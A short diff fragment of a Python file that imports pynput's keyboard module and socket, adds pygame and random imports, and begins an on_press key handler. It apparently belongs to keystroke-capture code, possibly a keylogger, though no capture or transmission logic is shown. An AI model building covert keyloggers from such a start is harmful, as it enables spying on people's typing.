@@ -1,7 +1,11 @@
 import pynput 
 from pynput import keyboard
+import random
 import socket
 import time
+import pygame
+
+pygame.init()
 
 def on_press(key) : 
     try : 
